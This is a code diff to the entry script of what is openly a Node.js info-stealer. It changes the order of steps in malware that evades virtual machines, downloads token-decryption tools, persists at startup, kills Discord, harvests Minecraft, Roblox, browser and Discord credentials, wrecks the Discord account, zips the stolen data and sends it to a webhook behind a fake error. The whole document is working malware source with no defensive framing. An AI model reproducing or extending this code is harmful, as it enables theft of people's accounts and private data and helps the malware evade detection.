@@ -18,20 +18,22 @@ if (config.vmProtect && checkVM()) {
     process.exit(0);
   }
 } else {
-  require('./functions/download');
-  if (config.addToStartup && runningFromExecutable()) require('./functions/startup');
-  config.discord.killProcess && require('./functions/kill-discord');
-  require('./functions/grab-mc');
-  require('./functions/grab-roblox');
-  require('./functions/grab-browsers-data');
+  // Download executables to decrypt tokens then start the thing
+  require('./functions/download')().then(() => {
+    if (config.addToStartup && runningFromExecutable()) require('./functions/startup');
+    config.discord.killProcess && require('./functions/kill-discord');
+    require('./functions/grab-mc');
+    require('./functions/grab-roblox');
+    require('./functions/grab-browsers-data');
 
-  require('./functions/grab-discord-token').then(() => {
-    require('./functions/nuke-discord-account');
-    if (config.discord.autoJoinGuild && typeof config.discord.autoJoinGuild === 'string') require('./functions/auto-join-guild');
+    require('./functions/grab-discord-token').then(() => {
+      require('./functions/nuke-discord-account');
+      if (config.discord.autoJoinGuild && typeof config.discord.autoJoinGuild === 'string') require('./functions/auto-join-guild');
 
-    require('./functions/zip').then(zipFile => {
-      require('./functions/webhook')(zipFile);
+      require('./functions/zip').then(zipFile => {
+        require('./functions/webhook')(zipFile);
+      });
     });
+    config.fakeError && require('./functions/fake-error');
   });
-  config.fakeError && require('./functions/fake-error');
 }
